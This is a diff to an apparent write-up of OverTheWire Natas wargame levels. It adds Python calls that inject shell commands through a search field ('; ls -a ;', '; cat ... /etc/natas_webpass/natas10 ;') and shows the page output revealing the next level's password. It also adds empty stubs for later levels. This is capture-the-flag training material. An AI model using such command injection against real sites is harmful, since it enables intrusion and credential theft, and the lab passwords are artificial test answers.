@@ -321,11 +321,30 @@ https://overthewire.org/wargames/natas/natas9.html
 > URL:      http://natas9.natas.labs.overthewire.org
 
 ```python
+natas = natasX
+
+# print(natas.natasX(9, "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl").text)
+# print(natas.natasX(9, "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl", endpoint="/?needle=; ls -a ;").text)
+# print(natas.natasX(9, "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl", endpoint="/?needle=; ls -a cd ..;").text)
+print(natas.natasX(9, "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl", endpoint="/?needle=; cat cd ../../../../../etc/natas_webpass/natas10 ;").text)
 ```
 
 **Output**
 
 ```html
+<div id="content">
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
 ```
 
 ## Natas10
@@ -336,6 +355,23 @@ https://overthewire.org/wargames/natas/natas10.html
 > Username: natas10
 
 > URL:      http://natas10.natas.labs.overthewire.org
+
+```python
+```
+
+**Output**
+
+```html
+```
+
+## Natas11
+https://overthewire.org/wargames/natas/natas11.html
+
+> Natas Level 10 → Level 11
+
+> Username: natas11
+
+> URL:      http://natas11.natas.labs.overthewire.org
 
 ```python
 ```
